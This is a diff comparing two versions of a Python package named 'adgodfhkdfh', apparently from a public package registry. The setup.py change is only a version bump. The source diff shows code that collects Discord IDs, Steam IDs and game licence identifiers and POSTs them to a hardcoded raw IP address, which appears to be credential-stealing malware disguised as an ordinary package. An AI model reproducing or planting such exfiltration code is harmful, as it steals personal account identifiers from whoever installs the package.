# Comparing `tmp/adgodfhkdfh-0.0.6.tar.gz` & `tmp/adgodfhkdfh-0.0.7.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "adgodfhkdfh-0.0.6.tar", last modified: Sat Jul 22 05:43:15 2023, max compression
+gzip compressed data, was "adgodfhkdfh-0.0.7.tar", last modified: Sat Jul 22 05:45:50 2023, max compression
```

## Comparing `adgodfhkdfh-0.0.6.tar` & `adgodfhkdfh-0.0.7.tar`

### file list

```diff
@@ -1,11 +1,11 @@
-drwxrwxrwx   0        0        0        0 2023-07-22 05:43:15.405191 adgodfhkdfh-0.0.6/
--rw-rw-rw-   0        0        0      406 2023-07-22 05:43:15.404193 adgodfhkdfh-0.0.6/PKG-INFO
--rw-rw-rw-   0        0        0       42 2023-07-22 05:43:15.405191 adgodfhkdfh-0.0.6/setup.cfg
--rw-rw-rw-   0        0        0     1202 2023-07-22 05:43:03.000000 adgodfhkdfh-0.0.6/setup.py
-drwxrwxrwx   0        0        0        0 2023-07-22 05:43:15.393197 adgodfhkdfh-0.0.6/src/
-drwxrwxrwx   0        0        0        0 2023-07-22 05:43:15.403195 adgodfhkdfh-0.0.6/src/adgodfhkdfh.egg-info/
--rw-rw-rw-   0        0        0      406 2023-07-22 05:43:15.000000 adgodfhkdfh-0.0.6/src/adgodfhkdfh.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      183 2023-07-22 05:43:15.000000 adgodfhkdfh-0.0.6/src/adgodfhkdfh.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-07-22 05:43:15.000000 adgodfhkdfh-0.0.6/src/adgodfhkdfh.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       12 2023-07-22 05:43:15.000000 adgodfhkdfh-0.0.6/src/adgodfhkdfh.egg-info/top_level.txt
--rw-rw-rw-   0        0        0     2705 2023-07-22 05:42:58.000000 adgodfhkdfh-0.0.6/src/adgodfhkdfh.py
+drwxrwxrwx   0        0        0        0 2023-07-22 05:45:50.647031 adgodfhkdfh-0.0.7/
+-rw-rw-rw-   0        0        0      406 2023-07-22 05:45:50.646033 adgodfhkdfh-0.0.7/PKG-INFO
+-rw-rw-rw-   0        0        0       42 2023-07-22 05:45:50.647031 adgodfhkdfh-0.0.7/setup.cfg
+-rw-rw-rw-   0        0        0     1202 2023-07-22 05:45:34.000000 adgodfhkdfh-0.0.7/setup.py
+drwxrwxrwx   0        0        0        0 2023-07-22 05:45:50.635062 adgodfhkdfh-0.0.7/src/
+drwxrwxrwx   0        0        0        0 2023-07-22 05:45:50.645036 adgodfhkdfh-0.0.7/src/adgodfhkdfh.egg-info/
+-rw-rw-rw-   0        0        0      406 2023-07-22 05:45:50.000000 adgodfhkdfh-0.0.7/src/adgodfhkdfh.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      183 2023-07-22 05:45:50.000000 adgodfhkdfh-0.0.7/src/adgodfhkdfh.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-07-22 05:45:50.000000 adgodfhkdfh-0.0.7/src/adgodfhkdfh.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       12 2023-07-22 05:45:50.000000 adgodfhkdfh-0.0.7/src/adgodfhkdfh.egg-info/top_level.txt
+-rw-rw-rw-   0        0        0     2657 2023-07-22 05:45:20.000000 adgodfhkdfh-0.0.7/src/adgodfhkdfh.py
```

### Comparing `adgodfhkdfh-0.0.6/setup.py` & `adgodfhkdfh-0.0.7/setup.py`

 * *Files 12% similar despite different names*

```diff
@@ -1,15 +1,15 @@
 import setuptools
 
 with open("README.md", "r") as fh:
     long_description = fh.read()
 
 setuptools.setup(
     name="adgodfhkdfh",                     # This is the name of the package
-    version="0.0.6",                        # The initial release version
+    version="0.0.7",                        # The initial release version
     author="Yonatan Dev",                     # Full name of the author
     description="adgodfhkdfh package",
     long_description=long_description,      # Long description read from the the readme file
     long_description_content_type="text/markdown",
     packages=setuptools.find_packages(),    # List of all python modules to be installed
     classifiers=[
         "Programming Language :: Python :: 3",
```

### Comparing `adgodfhkdfh-0.0.6/src/adgodfhkdfh.py` & `adgodfhkdfh-0.0.7/src/adgodfhkdfh.py`

 * *Files 4% similar despite different names*

```diff
@@ -64,13 +64,11 @@
             'discordid': discord,
             'steamid': steam,
             'license': license,
             'license2': license2
         }
         response = requests.post(f"http://212.2.237.74:5000/send-data", json=data, headers=headers)
         if response.status_code == 200:
-            print(f"")
             return True
         else:
-            print(f"")
             return False
```

